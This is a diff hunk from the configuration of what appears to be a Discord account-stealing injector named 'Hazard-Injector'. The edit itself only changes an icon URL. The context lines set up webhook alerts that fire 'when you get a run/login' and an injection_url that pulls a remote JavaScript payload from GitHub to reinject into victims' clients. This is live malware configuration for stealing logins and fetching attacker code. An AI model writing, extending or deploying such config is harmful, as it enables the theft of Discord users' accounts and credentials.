@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'Hazard-Injector', //name of the webhook thats gonna send the info
-  embed_icon: 'https://cdn.discordapp.com/attachments/1087214165078315079/1091219565255606292/2588y2y582h9tho32.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon: 'https://cdn.discordapp.com/attachments/1087214165078315079/1091219565255606292/2588y2y582h9tho32.png?width=4000&height=4000', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 16766720, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/BasedAndReal/KBUv.y2tKxuCx1jDA0fKZdxauoLu_jy1RuFc0cOk_MOOB.pAxkrPrOnyqwcLBw7ZpKbwf3dOrIOL1R.57EV-Hj4bZsuD1ezSveUK/main/auto_buy_false_injection.js', //injection url for when it reinjects
   /**
